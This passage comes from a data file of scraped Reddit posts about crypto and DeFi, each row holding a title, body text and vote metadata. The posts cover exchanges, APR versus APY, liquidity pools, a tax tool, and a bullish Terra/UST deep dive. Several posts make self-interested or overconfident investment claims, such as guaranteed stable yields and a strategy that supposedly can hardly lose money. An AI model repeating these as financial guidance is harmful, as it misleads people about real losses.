renvm’s token, ren is used as a bond to act as a validator “darknode” on the network. it requires 100,000 ren to register and run a node which is locked into a smart contract and not returned until the person deregisters their node. this encourages good behavior from participants. every time an asset is transferred across chains, a fee is taken which is paid out to the darknode operators. **kyber network** - decentralized exchange kyber network is a decentralized exchange and payments tool that allows people to instantly swap their tokens for other tokens without having to deal with a centralized order book. it makes use of pools of crypto funds called “reserves” that allow for several routes to convert the tokens, ultimately finding the best price. though similar to loopring, the kyber network has a main exchange interface and swaps the token instantly, while loopring is the underlying protocol and network of many exchanges, and functions as an orderbook. when converting eth into another token, the kyber smart contract first asks various reserves to get the best exchange price. then, you’ll see the exchange rate and decide whether or not to go through with a swap. if you proceed, you will send 1 eth to a kyber smart contract. once received, the reserve will do an on-chain exchange and your account will be credited with your token of choice. when converting one erc20 token to another, kyber uses eth as the intermediary. that is token a -> eth -> token b. knc is the native token of kyber and reserve holders must pay for their right to manage the reserves with knc. holders can also stake their knc to the kyberdao which gives them governance rights as well as returning a staking reward. additionally, it allows vendors who accept cryptocurrency to accept a wide variety, but still get paid in their preferred currency. the kyber network works as a service in these types of transactions. **loopring** - decentralized exchange and layer 2 loopring, though similar to kyber, is unique in this list as it is a decentralized exchange protocol, not a dex itself. what this means is that loopring allows anybody to build a custodial order-book based exchange on ethereum (or any other smart-contract platform) and loopring then combines the pools on those into one massive pool and matches orders across these separate exchanges built using loopring’s structure and participating in the network. additionally, when you place your order, your coins remain yours until the order is executed. your coins aren’t locked into the order book and you can cancel or adjust your order as you please. those responsible for matching these orders, miners, are compensated for their work in lrc, and they are incentivized with higher rewards for finding better exchange rates. loopring is also unique in that it is a layer two solution. that is, all transactions and trades take place *off chain* and thus the fees for trading are astronomically lower than ethereum's during busy times, the downside being that it takes a bit of extra knowledge, and the desire to actually move your crypto there. **balancer** - decentralized exchange balancer is an automated market maker similar to uniswap in that people can provide their crypto to liquidity pools to earn rewards, but differentiated by the concept that balancer allows people to create their own liquidity pools with up to eight assets pooled instead of just two. the creator of the pool arbitrarily sets the weights of the underlying assets which are automatically rebalanced as the prices fluctuate to maintain the weight. this basically allows anyone to create their own self balancing index fund or invest in someone else’s. a downside to this is increased divergent loss as the prices of the various assets can fluctuate more broadly than is possible with just two assets provided at 1:1. it also leaves open big arbitrage opportunities as there is no oracle integration to bring in outside prices, thus the prices in the pools only change when someone makes a trade. bal is the governance token for this protocol and as the protocol develops, bal holders will be able to “help guide the protocol to its fullest potential.” balancer specifically names some goals such as deploying the protocol on blockchains other than ethereum, implementing layer two solutions, introducing fees at the protocol level to generate revenue, and more as examples of actions bal holders can make. ----------------------------------------------------------------------- there ya go, hope this is helpful!",257,66,1.0,2021-03-08 20:06:40,web3,defi,charmcitycuddles,False,190.6

If you wanna leave now is the time to do so,"the $sol token isnt always aligned with the chain, remember that. many metrics are at ath’s or near to it, the recent breakpoint shows a bright future ahead across the ecosystem. hell we still have our founders with us, something many chains cant say for themselves and our builders never stopped building. many shillfluencers who were bullish on $sol following btc and eth’s legacy are bearish because of the ftx news outright and refuse to scalp lower per their words. ask yourself truly, does this even make sense? btc survived mt.gox and myriads of others. eth survived a fork and split of community from a massive hack back in the day and many others. now that $sol has an event to follow their respective legacies and the 2017 $eth fractal down to near single digits while the blockchain is doing better then ever we are supposed to be worried? time to build some character sol community. get ready to scoop up all you can, if all the splits of ust and luna can be worth 3 bil best believe we can survive this, this is financial advice. lastly about our “main backer”. its obvious our main backer never had money to cover themselves so theres nothing they could have done for us going forward. its hilarious that all their profit came from dumping ico’s on our retail ecosystem. we never needed them at all did we? if theyve been insolvent this whole time or close to it they were doing f all for the ecosystem accept borrowing money they stole from all of us. if we cant make it out of this as a community we never deserved to make it",191,166,0.92,2022-11-08 21:36:54,web3,solana,EmbarrassedCoach2222,False,190.2

Differences between APY & APR (in Crypto),"apr and apy are used in many yield farming programs in defi protocols. however, they are not the same thing! we, the participants in the market, are not only investing but actively receiving yields by farming and staking defi tokens. so these basic terms are not only important, but they are also information that helps you to invest more effectively. both are related to returns. but how are they different? why are they not interchangeable? we discuss that in today's newsletter. definition apr stands for annual percentage rate. it is the actual annual rate of return, **not** taking into account the effect of compound interest. apy stands for annual percentage yield. it is the actual annual rate of return, taking into account the effect of compound interest. who uses what? apy is better to calculate your returns on investment while apr is more common in lending. >quick math: which do you think is higher? apy, the one that considers compounding. what are they different?apr for example, a yield farming program offers an apr of 100%/yr. you use $1000 to join this program. one year later you will receive $2,000, where $1000 is the initial capital and $1000 is apr . once you see the apr, it is possible to immediately calculate how much profit will be earned at the end of the period. this profit comes from your staking or farming, so just join at the beginning to get the result for apr interest. formular apr = r x n where: r: the interest rate of the year; n: interest period (n = 1, means 1 year). apy apy is another way of calculating the percentage of real profit you will receive. >what will you get if you receive profit every day from staking and you will add that to your principle and earn interest on that **every day**? if you have an apr of 100%/yr with getting daily profit, you have to divide apr by 365 days to calculate the interest received daily (0.27%). then reinvest this interest continuously every day. the amount you get is $2,714.57, where $1000 is the initial capital and $1714.57 is apy . assuming you participate in farming pairs on solana's raydium application, i also combine step finance to know the apr and apy of these farming pairs. typically, i am staking $ray on raydium (current project apr is 35.33%), with $1,000 you farm at the beginning of the year to the end of the year, the total income will be $1,423.51. formular apy = (1+r)\^n - 1 in which: r: the interest rate of the period; n: interest period (n=1 means 1 day). awareness as such, today's projects often offer 2 ratios of apr and apy to show users what the rate of return is currently available. however, some projects that give daily, 7-day interest rings directly provide apy. this has two implications: * first, displaying apy will produce a larger percentage than apr , making brave people feel that they will receive more profit. * secondly, the apy interest is only true if the user reinvests (restake, refarm) continuously in the allowed period (e.g. when receiving rewards, immediately stake). today we see a lot of aggregator protocols already using this ability to increase profits, continuously reinvesting within the capacity of the original protocols. this is really good if the transaction costs are not significant. hopefully, we can find those solutions in layer 2. read more [here](https://economicsdesign.substack.com/p/apy-and-apr-83f)",268,38,0.98,2021-05-28 19:46:09,web3,CryptoTechnology,economicsdesign,False,185.79999999999998

For the savvy Liquidity Provider it’s not impermanent loss but rather very permanent profit,"browsing around the web i’ve found that all the free lp calculators are either 1. online forms based therefore not very customizable 2. focus too much on the impermanent loss of lps without presenting the benefits hence, i decided to make a google sheet that visualizes your lp profit against underlying token price changes, taking into account the trading fees and farming rewards. the sheet download link is at the bottom of this post. now let’s jump into a real world example, the chr-busd pair on pancakeswap(pcs). chr (chromia) is a relational blockchain used for l2 and many upcoming blockchain games, such as my neighbour alice and chr has also announced an 80 mm usd grant program to further develop their ecosystem. the chr-busd lp pair on pcs has the following parameters • 10% lp trading fees in the chr-busd pair • 40% lp farming rewards in the chr-busd pair assuming we invest 1000 chr which is worth $560 at the time of this post and 560 busd into the lp for 1 year, we input that into our sheet parameter as follows &#x200b; https://preview.redd.it/4vxdbvadjo881.jpg?width=1016&format=pjpg&auto=webp&s=3ae6e8950527683899441e6fcc2eb50150892f0b as chr has a 25% staking reward if you stake the token, we use this value to set token a staking apr and because the other pair is a stable coin (busd), for token b we use a starting price of $1 with 0% starting change and step. from coinmarketcap we know that the average yield for depositing stable coins is \~3%, hence we set that as our token b staking apr. using the above params, we simulate what would happen if we invested $0.56 x 1000 x 2 = \~$1120 worth of capital into the lp compared with staking the individual tokens over a set period, the sheet will then generate the following table value*s* *edited table screenshot to show the net pool value after lp fees and rewards* https://preview.redd.it/j81c1v8y7r881.jpg?width=1355&format=pjpg&auto=webp&s=cea8708feae45a938762c2a805d0b9891b651c7a along with the following chart &#x200b; https://preview.redd.it/27swyftgjo881.png?width=873&format=png&auto=webp&s=8e7c46d34691baabe95fdb1f4756b211dca16887 the horizontal x axis being token a price change % and the y axis being the lp and staking token profit % we see from the above chart how lps outperforms holding single coins even when considering the coin staking rewards. at this point, you might be wondering where’s the impermanent loss people always talk about? to see the “impermanent loss” effect we need to zoom out further, so we set the token a step % in the chart to 20%. &#x200b; https://preview.redd.it/226ianyhjo881.png?width=873&format=png&auto=webp&s=9dd7515492b1d35f47c460b3b553eae4e17398af impermanent loss is not an actual loss, it just means you’d make less profit than if you had held and staked the individual tokens. for the chr-busd pair, that would only occur if chr goes up > 150% in a year, however the lp provides tremendous downside protection, as from the chart you’ll see that chr price needs to go down more than 75% for you to suffer only a minor loss. let’s try simulating another pair, the bnb-busd &#x200b; https://preview.redd.it/4r181m7jjo881.jpg?width=1008&format=pjpg&auto=webp&s=bd263b38ff3502f2666c1c30049fd3a6a81224c5 since bnb has a staking reward of \~10%, we input that value into the parameter and assume we initially create the lp with 100 bnb and 53,000 usd. &#x200b; https://preview.redd.it/9z2zxh5ljo881.png?width=873&format=png&auto=webp&s=126512b2c4271a1e8674d8b3c2bd89ae21f987a6 the generated chart shows that if you invest in the bnb-busd lp, bnb price needs to drop by more than 60% for you to suffer a loss. the lp pair will also perform better than staking bnb and busd up until bnb rises more than 170% in price. on both lp pairs we analysed, the theme is similar, in that if you stake lps for a long enough duration, it will beat holding single coins in more than 90% of market conditions while protecting your investment from downside risk. note however that pcs farming rewards are in cake and so far ytd, it tends to be inflationary which may cause your farming rewards go down over time, to mitigate that you can hedge via futures at ftx &#x200b; https://preview.redd.it/itl8nujojo881.jpg?width=1366&format=pjpg&auto=webp&s=5816964183f4108aeddc9ca65ec0684213b7f7c0 which funding rates are now hovering near positive\*\*\*, meaning you’ll get paid interest for shorting cake while synthetically going long on it farming pcs lps, effectively boosting your yields.\*\*\* and finally, to further reduce your risk and optimize yields, best to put those lps into an autocompounding vault that automatically convert the rewards token into more lps and redeposit it back to the pool thereby improving your apys. for that purpose, i’d like to recommend [https://happyhippo.farm](https://happyhippo.farm) , made by yours truly, where the hippos are happy and everything is awesome, like the lego movie theme song. **tl;dr: it’s very hard to not make money using pcs lps farming rewards,** **google sheet link** [lp calculator chrbusd](https://docs.google.com/spreadsheets/d/1wvhtkdru4jfs0tpitdrhvvzihjxp5vzmz_takyf7zl4/edit#gid=592536586) *ps: if you guys like this post, i’ll make another one regarding not delta but gamma neutral yield farming.*",250,59,0.97,2021-12-30 08:15:48,web3,defi,indonesian_activist,False,183.29999999999998

I made a website to help with taxes for DeFi,"https://defitaxes.us i posted this about 5 months ago. i've been working on it for about half a year, and now it's (mostly) feature-complete. unfortunately it's also bug-complete :d this is hands-down the best tool to do your blockchain taxes, however it will not automatically process everything for you. your input is required to correctly classify many of your transactions, and there are tools to do it in a reasonable amount of time even if you have thousands of transactions (extremely ballpark estimate: 1 hour of work per 300 transactions or so, once you familiarize yourself with the available tools). most important features: 1) support for 8 blockchains -- everything that etherscan team made scanners for. also includes all the etherscan team's bugs that they haven't fixed! :d (especially on arbitrum) 2) counterparty & method signature recognition -- i page-scraped etherscan&co label clouds for counterparty names. what this means is in many cases i can guess who you are transacting with, which will help you identify the transactions. in many cases it'll also tell you what function of smart contract you are calling, helping in identification further. 3) custom types -- this to my mind is the killer feature here. if you repetitively made the same kind of transaction many times, this allows you to apply the correct tax treatment to all of them at once. for example, if you claimed reward from some shitcoin.finance a hundred times, you need exactly three clicks to apply the right tax treatment to all of those rewards: click on one of those transactions, click on ""select transactions with the same operation & counterparty"", and click on provided ""claim reward"" custom type. 4) intuitive ui -- every transaction is color-coded by how certain i am of processing it correctly. 5) it's completely free, and will stay that way until most of the bugs are squished. then i am planning to charge a tiny percentage of your assets. deficiencies -- at the moment: 1) one blockchain at a time. you get one set of tax forms per blockchain. i don't track transfers between your blockchain accounts. deposits are purchases, withdrawals are sales. 2) no support for several blockchains -- i want to add solana, terra, harmony, and cardano, however they don't have compatible scanners, so it'll take a lot of work for each one of these. 3) no pagination -- this is very fast, but if you have thousands of transactions the browser simply can't paint them fast enough. noticeable slowdown after about 3k transactions. pagination is planned. 4) lack of protocol-specific support. i have custom code for opensea, compound & uniswap v3, but that's it for now. everything else is recognized based on transaction structure only. 5) us-specific. planned improvements: 1) pagination 2) some opensea integration so i can actually tell what those ""openstore"" erc1155 transfers are. 3) more blockchains i am neck-deep in defi myself and this was a labor of love to make a website that can actually be used to do your taxes (i tried several competitors and found them all severely lacking). i'll be doing my own taxes using it. let me know what bugs and problems you encounter :) update january 2023, new thread: https://www.reddit.com/r/defi/comments/10ejrwk/defitaxesus_a_website_to_do_your_defi_taxes_for/",185,138,0.98,2022-01-01 13:46:44,web3,defi,Xirax,False,176.0

Finance isnt why crypto matters,"i feel like this is a relatively unpopular opinion, maybe because of how early we still are. i think this is an idea worth spreading, especially since people's understanding / view of crypto will affect how it is adopted. financial applications are how crypto gets it's foot in the door. crypto is naturally suited for financial applications because of it's structure and how conceptually it is easy to understand x tokens = y dollars. however, purely financial applications are not what makes crypto so revolutionary. crypto is a paradigm shift in how software applications can be structured to create decentralized, self-organizing, transparent/fair systems. in the old model (our current model), software converges on huge, monopolistic tech companies. because software scales so well, this makes sense. it is inefficient to have multiple software solutions that solve essentially the same problems. this has the unfortunate side effect that large segments of public life are controlled by small groups of engineers and privately incentivized businessmen. with crypto, you instead build a framework for a decentralized network that incentivizes and directly rewards people who add value to the network. platforms like this do already exist in the old world, one example of this is youtube. it incentivizes creators to create videos, advertisers to pay for the ability to reach viewers, and makes it easy for viewers to watch videos. so why do we need crypto if we already have these kind of apps? crypto in my mind adds two very important things: 1. standardization 2. decentralization the first, standardization, simply means that instead of building these platforms completely from scratch, which is a massive technological undertaking, we can use existing crypto/smart contract sdks to create a basic network within minutes. this is huge, as it greatly reduces software development costs, which in turn increases competition. the second, decentralization, means that we dont have a single source of failure. if youtube as a company is fined or they make bad business decisions, everything the creators have built vanishes along with them. also, the network can vote and reach consensus on what is best for the network as opposed to only the shareholders. this helps a lot against corruption in general. with this we are forced to bake trustless transparency into our important software platforms. it bothers me that people are mostly interested in the financial aspect of crypto. i understand we are very early and still building out the interchain infrastructure, but please stop trying to turn crypto into the stock market v2.0 sorry for the long post, im curious to hear your thoughts! i could go on but i need to work lol tldr; crypto is a paradigm shift in software applications allowing the standardization and decentralizion of big tech (easily corruptible) platforms that directly rewards value contributors while minimizing middlemen",221,75,0.95,2021-06-29 02:34:15,web3,CryptoTechnology,bnunamak,False,172.1

Stablecoin staking is very underrated. People staking stablecoins didn’t feel a thing this entire market crash.,"while staking your entire portfolio in stablecoins wouldnt be advisable cause you can still maximize profits investing into other things as well. but putting aside a considerable amount of stablecoins and staking them would be a great way to protect yourself especially in volatile times like these times. stablecoins apys are actually very high reaching up to 15% on some platforms like yearn, yieldy and yieldapp. so it wouldn’t be a bad idea honestly. it would also set you along the side of the safer kinds of staking since a lot of these stablecoins are backed up in real life. would stay away from usdt though and maybe stick to real 1:1 ration coins like usdc, eurst and ust that are actually audited unlike tether.",165,158,0.93,2022-03-02 22:40:43,web3,defi,Mandrake_m2,False,171.5

Shifting the paradigm for Dapp development,"right now there is a massive awakening on what defi is capable of. opening financial products up to all is a great idea, but as it stands today we are severely limiting the innovation and development that can happen in the space because the tools we have are extremely inadequate. solidity (and most of the programming languages used for smart contracts today) are general purpose languages - you can build anything with them. but because they’re so generalized, they don’t do a very good job at the one thing that you need most for defi and crypto - managing tokens. in solidity, tokens are created as a list of account balances (uint256’s) inside an erc20 smart contract (e.g. account 0x...123 has 50 tokens, 0x...456 has 100 tokens, etc). to execute a token transfer, a message is sent to the contract with instructions to update a particular account’s balance. but because solidity has no native concept of an asset, the ethereum virtual machine (evm) doesn’t know the difference between a uint256 that represents a token, and a uint256 that represents any other variable. logic around asset behavior, such as the fact that a token shouldn’t be in two places at once, doesn’t exist - the developer has to implement this kind of logic from scratch, for every single contract. it’s like using a swiss army knife to make sushi - sure it can just about do the job, but the sushi gets hacked to pieces. no wonder we see hacks pretty much every week with solidity smart contracts. so, what is the right tool for the job? well first, what is the job? defi is the big use case for crypto. handling assets, handling value represented by tokens. so, we need a tool designed from the outset to handle tokens. in scrypto, assets are a native feature of the language. to create a token in scrypto, you just call a native function directly within the language. for example “.new_token_fixed(1000)” creates a token with a fixed supply of 1000. to transfer the token, you can call on native functions such as “.take(1)”, which takes a single token, or “.send(1)” which sends a single token somewhere. these tokens are guaranteed to behave like physical assets (like a physical coin), as they always have to live in only one place, which makes it way more intuitive. being intuitive has two massive upsides. first, it makes it easier, which means the barrier to entry for developers is lower. this will get more devs programming more dapps with less limits on innovation. the second upside is it makes dapps more secure. if you can easily see how assets will behave, you can easily pick out when they're going to misbehave. that makes programming and auditing far easier. scrypto is still in development, but the ""alpha"" release, alexandria, has just come out . this allows it to be run on a private, local (ie offline), instance of the radix network. dapps can be developed and tested here, before going live on the real network next year. this early release is both to familiarise developers with the new language and mindset, and also for the team to get feedback on any shortcomings that might exist, and how they can be addressed. i'll post a link below if you're interested in diving deeply into this. if you're a developer just starting out, then maybe giving the documentation a look could really help you make your ideas a reality.",84,273,0.89,2021-12-15 10:28:54,web3,CryptoTechnology,Fun_Excitement_5306,False,168.5
Deep dive into Terra Ecosystem,"sooo, i initially wanted to post this in [r/cryptocurrency](https://www.reddit.com/r/cryptocurrency/) but do not have enough comment karma, so i been posting to some other subreddits...lol hey all, been lurking around for a while and first time making a post. recently i haven't really been seeing any deep dives or project highlights, seems that posts are just hopium, some technical analysis here and there for a breakout or breakdown, and the obligatory elon hit piece. so to spice things up i'd like to present my case for terra and why i believe it is such an exciting project with huge potential for growth! i remember the first time getting into crypto i was just blown away by the possibilities in blockchain and defi (tbh i'm still very new only been in the space for a few months), maybe many of you remember those first moments as well! it feels like partaking in a revolution that will change the world. however, defi on ethereum for the average joe is complicated as projects tend to run independently and are also prohibitively expensive with the gas fees. matic network integration has helped lower gas fees but makes the ecosystem even more complicated imo. plus not many exchanges support matic network which means moving funds still costs a lot of gas. so for the past few weeks i've been playing around in the terra ecosystem and been loving it! projects are all interconnected and built on top of each other which creates a uniquely seamless experience that just...flows. prior to the crash in may, terra had not yet undergone a ""trial by fire"". prior doubt for how terra would do in a market crash has now been largely assuaged, and the robustness of the systems has been proven. add to that the low gas fees and it really does feel like defi made for the masses. &#x200b; [note: many of these are up-and-coming projects.](https://preview.redd.it/ubkiv6t7w7b71.jpg?width=2500&format=pjpg&auto=webp&s=e1f7326e906f488e8589070159e8415679c3d99e) **what is** [**terra**](https://docs.terra.money/ecosystem.html#terra-website-and-socials)**?** terra is a blockchain built on cosmos sdk and developed by terraform labs, a company based in south korea founded by do kwon. its core product is an algorithmic stablecoin called ust. the way ust works is a bit complicated but ill try my best to explain. ust is pegged to another token called luna. ust retains the peg by either burning luna to increase the supply of ust (by buying ust), or minting luna to decrease the supply of ust (by selling ust). this creates an opportunity for arbitrage where users are incentivized to keep the peg. for example, if ust loses the peg and becomes 1.50$, people will sell their luna to ust, increasing ust supply and lowering it until it reclaims the peg. in reverse, if ust is .50$, users will buy luna which decreases ust supply until it reclaims the peg. there are videos explaining this here: [https://www.youtube.com/watch?v=7hlizxkbxfy&t=917s](https://www.youtube.com/watch?v=7hlizxkbxfy&t=917s) [https://www.youtube.com/watch?v=hl8tcvhyhmm](https://www.youtube.com/watch?v=hl8tcvhyhmm) however, decentralized algorithmic stablecoins have largely failed to hold their peg in the past and gone to 0. (dai, which is also supposedly 'decentralized', holds a large portion of assets in usdc to back it, which conversely makes it centralized.) this is because of something called the ""death spiral"" where black swan events create enormous pressure to sell the stablecoin, something we saw in the crash back in may. ust lost its peg and dropped to \~.94$ before making a full recovery over the course of a few days. this is actually extremely positive for terra as a whole, because ust was able to prove its validity in a real world scenario (one of the worst weeks in crypto history) and survived through the crash. since then, the team behind terra have implemented reforms to the system to make it even more robust in high volatility market scenarios. *so how was ust able to reclaim its peg where so many others have failed?* by creating an ecosystem that drives organic demand for ust, and this is where other projects in the terra ecosystem come into play. as i mentioned before, the terra ecosystem just *flows,* and you will see why. [anchor](https://anchorprotocol.com/) **&** [mirror](https://mirror.finance/) **protocols (backbone of the terra ecosystem):** in traditional finance, the first step to access financial services is to open a bank account. on terra, this takes the form of anchor. **anchor** is a defi savings platform that offers a stable \~20%apy on ust deposits. it provides the most basic services of a bank, depositing and borrowing. in contrast to other defi protocols, anchor's main selling point is in guaranteeing the stability of its interest. how is it able to offer stable high yields? borrowers post collateral in the form of bluna (which exchanges 1:1 with luna). since luna is a pos cryptocurrency, it generates around 13% interest currently and this interest along with interest on the loan itself is given to depositors. 20% interest is achieved by over-collateralizing the loans. *however, what would happen if there are not enough borrowers to keep up with depositors?* a few months ago this question could only be answered in theory. today, it can be answered in hindsight. anchor has a reserve fund where extra yield is deposited. the yield reserve fills up during bull markets when more people are borrowing. this is then used to pay depositors during bear markets when people begin to de-risk and there is less borrowing. the system was given a big test in may when luna crashed and many borrowers were liquidated. since then, the yield reserve has depleted rapidly which forced terraform labs to step in and inject capital into the reserve (which happened today). terraform labs sees this as a one-time intervention to give anchor enough time to develop into a fully self-sustaining system. anchor has increased ltv (loan-to-value) ratio since then meaning you can borrow more, is working on decreasing the risk of liquidations, and will soon be implementing the use of beth as collateral (bsol, batom, and more are in the works). a less volatile asset like eth \*should increase the amount of borrowers. [a clear drop in borrowers in mid-may. however, anchor has proven to be a safe haven during bear markets as total deposits have continued to increase steadily. just like in tradfi, people sell off equities and put their cash back in their bank accounts. unlike tradfi, cash sitting in anchor accrues 20&#37; interest per year.](https://preview.redd.it/hw3d9gpdw7b71.png?width=2034&format=png&auto=webp&s=ef69106f1543a143cc24c76fadb3dc5be051dc5b) after opening a bank account, the next step might be to begin investing by buying equities. enter mirror protocol. **mirror** is a synthetic stocks trading platform akin to synthetix on ethereum for those who are familiar. what sets mirror apart are its liquidity pools and integration with anchor. depositing on anchor creates a transaction that yields a token called aust (anchor ust). this can be thought of as a receipt for your deposit. users are able to take the aust and short-farm massets (mirror assets) on mirror to stack yield. the aust represents your anchor deposit and so is by itself an appreciating asset, meaning you **are not** losing the yield from anchor by moving the aust to mirror. https://preview.redd.it/2hy7twriw7b71.png?width=2018&format=png&auto=webp&s=3a225c70596eaa3fe1c6a7c03d2ce8d2e53fffaa interest on mirror is paid out in mir tokens, which can then be used to stake for 18%apr and participate in governance proposals, deposited with equivalent ust into the mir long farm for even greater yields, or exchanged for ust and deposited back into anchor. long/short farming on mirror allows you to create ""delta neutral"" strategies where you short and buy the same asset and stack the yields from both sides. you are protected by the volatility of the underlying asset by buying and shorting at the same time - thus delta neutral. there's a great overview of interesting strategies here: [https://www.youtube.com/watch?v=ttqo4s6is5c&t=1042s](https://www.youtube.com/watch?v=ttqo4s6is5c&t=1042s) as a side note, mir only has a market cap of around 200 million, whereas synthetix (snx) has market cap of 1.3 billion. however, mirror has higher tvl than synthetix. [total value locked tvl in defi protocols](https://preview.redd.it/9l54qegmw7b71.png?width=1938&format=png&auto=webp&s=5ca8dc12e0fb776f7c1cc36cbced95f7e1115906) granted, mir price has been falling, but i think it represents significant undervalue that will eventually be recognized. but perhaps buying or shorting massets tied to individual stocks is too risky for you and you would prefer the relative safety of etfs. in that case you won't have to wait much longer! enter [nebula protocol](https://twitter.com/nebula_protocol?lang=en). though yet to launch, nebula aims to decentralize etf investing by creating ""[clusters](https://forum.neb.finance/t/initial-clusters-on-nebula-to-be-cont/22)"" of massets on top of mirror. this means the ability to buy safer diversified etfs while also allowing for some very interesting themes such as a meme coins cluster that is essentially an etf of meme coins for the more speculative amongst us. clusters will be created with input from the community. **new projects:** [pylon protocol](https://gateway.pylonprotocol.com/) and [orion money](https://orion.money/) pylon protocol has been the newest project to launch in terra. it is primarily a launchpad for terra based projects that serves some other functions as well. notably, it will integrate with anchor by allowing users to deposit into the system and then using the yield from anchor to pay for recurring transactions (eg. subscriptions, loan payments, etc). at the end of the term, you receive your initial deposit back in full. orion money is a cross-chain stablecoin application that leverages the yield of anchor allowing for the deposit of other stablecoins like usdt, usdc, dai, and busd. **future projects:** there are too many to get into, so you can look for yourself [here](https://terra.smartstake.io/p/all). also shoutout to [angel protocol](https://twitter.com/angelprotocol) that is creating perpetual charity donations through delegation of luna and donating the returns! **airdrops**: saved this for last as the cherry on top. the terra ecosystem is probably the most generous to its users in terms of airdrops. luna stakers are automatically eligible to receive weekly airdrops which can last up to two years from launch. projects currently giving weekly airdrops include anchor, mirror, and pylon protocols. new projects launching on terra often have ""genesis"" airdrops, which can be quite substantial. nebula and orion have both announced genesis airdrops! furthermore, new projects often offer pre-sales to members of the community. the newly launched pylon protocol sold its mine token for .01$ each during pre-sale and is already worth .08$ a few weeks later. (currently pylon's phase 2 launch is letting users deposit ust for fixed terms which generate interest in the form of mine tokens) typically a company ipos after all the big investors have already bought in. retail (you and me) are the last on the train. pre-sales are like getting into a company before its ipo, and terra has set this precedent early on. due to the interconnectedness of projects in the ecosystem, once the precedent has been set, i believe that users would expect it and new projects would be incentivized to follow suit. \*note: airdrops are taken into account when calculating luna staking rewards. [source: https:\/\/terra.smartstake.io\/airdrops](https://preview.redd.it/4am2v9jzw7b71.png?width=2452&format=png&auto=webp&s=4ef01e228ebb0e7a9a5eed256d1503f6747b119f) *overall, the ecosystem is still young but the integrations are incredible. it feels more like a cohesive unit than other defi projects. i think this is quite compelling because it creates better user experiences and can flourish on its own. once you enter, there's no need to exit. even if other blockchains or exchanges don't adopt ust (though i don't believe this to be the case. recent announcements from* [*bitfinex listing ust*](https://twitter.com/bitfinex/status/1413436111788068864)*,* [*harmony one partnership*](https://twitter.com/harmonyprotocol/status/1412806345833672704)*,* [*solana integrations*](https://twitter.com/mercurialfi/status/1413130414470799369) *suggest adoption is increasing and certainly many more to come), the terra ecosystem will continue to thrive. and finally, to close the loop, organic growth fueled with greater external adoption will drive demand for ust where even in market downturns, people will continue to use ust in protocols such as anchor thus securing the accuracy of its peg and legitimizing ust as the best decentralized stablecoin.* **tldr: terra has created a truly decentralized stablecoin within a flourishing ecosystem in the form of ust that has proven its resistance to drastic market volatility. however, terra's vision doesn't stop within its own ecosystem, it aims to be the most utilized decentralized stablecoin on all blockchains. given all the fud surrounding usdt, the centralization of usdc and dai, it seems that the defi space really is in need for a true decentralized stablecoin.** **disclaimer**: i hold luna as well as mir so may be biased in my perspective. however, during these bearish times, greater conviction to hold can only be granted by greater understanding of the underlying asset. stay safe out there! also, any terrans out there that would like to add or correct anything please feel free to do so!",206,87,1.0,2021-07-14 14:03:02,web3,defi,AventadorDH,False,168.4

"6 months into DeFi and Crypto, here's what I've learned—","hey there everyone, this is going to be a long post. been a longtime lurker and i'm thinking my karma is finally high enough to post. i've spent six months now in this space (which seems like a short time but really feels like two years), been through the highs and the lows. i wanted to do a public ""debrief"" with the aim of informing others who are just starting, and also to collect my thoughts so i can learn better. without doxxing myself of course. my first crypto buy was bitcoin back in january, and yes, it means i got it for under 35k or something. and i traded it in the following weeks for about 10% gain each trade. my take on crypto was: it's highly speculative, very risky, and you should only commit a small amount of money to it, but you shouldn't commit 0. lesson learned, i also bought eth for under $800 an sold it for $880 or something. so when i first discovered defi projects in march, i started to see the real potential of adding more crypto to my portfolio. after all, what if crypto is not just a speculative asset, but part of an ecosystem with competitive benefits compared to banks? then its true value, its fundementals, would be much higher. so slowly i got to know more and more about it, and that eventually resulted in my ""all-in"". i decided to put most of my savings into eth and started using eth apps. my first mistake: underestimating transaction costs. it feels easy to click buttons and do things on the ethereum blockchain, especially back when 5-15 gwei was the norm, and transactions took maybe 3 minutes to confirm on average. but man was it expensive. all in all, in my first three months of defi i spent 1.5k usd on all my transactions. i had invested less than 4k at the time. it was devastating to realize that, but i came to terms with it and moved on. that's also what got me more interested in projects that saved gas cost like dracula. i was getting the hang of providing liquidity on sushiswap and collecting sushi rewards, but i was still heavily in the red. then one of the worst things happened: one of the tokens i was holding took a 90% plunge. i was devastated. my 3k was now 300. but i collected my thoughts and sought to understand where it went wrong. i looked at the numbers on etherscan. one advantage of the blockchain is that you can always see what was happening, if you could make sense of the data. i saw that 99% of the token holders were still in, which meant the community still believed in the project, and long story short, i decided to become more active in the community. i wouldn't say i was ""fighting fud"", but mainly i presented the numbers and facts, as well as learn more about how the protocol and space worked. i was eventually doing copywriting for the project, and even got offered a position. this is where i got the drive to continue. i saw that a community could hold on strongly even after a 90% plunge, so long as the facts were presented, and the devs come clean. so i continued farming on eth. it still wasn't profitable due to the gas cost, but every new token i farmed helped me understand a little more about the ethereum economy. i look through and researched about 15-30 projects a month while farming on sushiswap. every onsen launch was an opportunity to learn. one of my regrets: not getting into ohm when it was still in the early liquidity mining phase on sushi. when i discovered polygon, and moved my funds over, that was a breakthrough. suddenly, i could use the protocols that i've been hearing about all the time, but we're too cost-prohibitive to use (due to the ratio of gas fee to earnings). i used aave, curve, sushi kashi, and more for the first time on polygon. and it was beautiful. all the research i had done, i could finally see it in action. also the fluidity of funds in polygon is amazing. you can switch your tokens from one farm to another in a flash. and it basically cost nothing. i was able to get in on polycat when it was still $5 fish, and rode it all the way up to $50. i was also in $1. 45 titan, but we all know how that turned out. basically, polygon was like a special commercial zone with low taxes. it invited innovation, but unfortunately also profiteering. a lot of sketchy bsc inflationary farms came in and started crowding the space with nonsense tokens. i can't lie though, it was insanely profitable for a while. and through the market downtime of april-may, i still made around 5-7k in profits, because polygon tokens were mostly pegged to stables. i rode one shit coin farm from an extremely profitable launch, right into the ground in 24 hours. i also got in deep with iron finance v1. i was getting wary when mcuban got in on titan. i sold my pot and put half into terra luna, and kept the other half in stables. i should've stayed out, because the next thing i knew, titan plunged back to 29 and i was buying back in, hoping to get a quick profit. and that would become the transaction confirmation screen that haunts my dreams for the rest of my life. i slept soundly too, believe that this dip would correct itself just like the many others before, that titan was ""too big to fail"" at 2.x billion liquidity. all of that vanished the next morning. i couldn't say anything. it was 0. honestly i kept it together for longer than i thought. i wrote a post on my personal insta about lessons learned, and i checked on my other funds just in case. they were safe. but i had lost close to half my net worth that day. and all within 8 hours. it wasn't until i called my partner and told them about it that i could cry out loud. but that felt good. i could finally talk to someone about it. even though most of it is money i didn't have before defi, it's still a good year's worth of salary to me. it represented future possibilities, moving abroad with my partner, or putting a down 